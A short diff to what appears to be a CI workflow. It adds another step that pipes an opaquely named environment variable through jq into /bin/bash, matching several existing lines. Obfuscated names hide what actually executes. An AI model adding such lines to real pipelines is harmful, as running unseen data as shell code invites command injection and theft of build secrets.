@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$fgep2274" | jq -r .eah2255 | /bin/bash
           echo $movr7 | jq -r .pd403 | /bin/bash
           printf '%s' "$fk4" | jq -r .mi69 | /bin/bash
+          echo $a75 | jq -r .nqg905 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
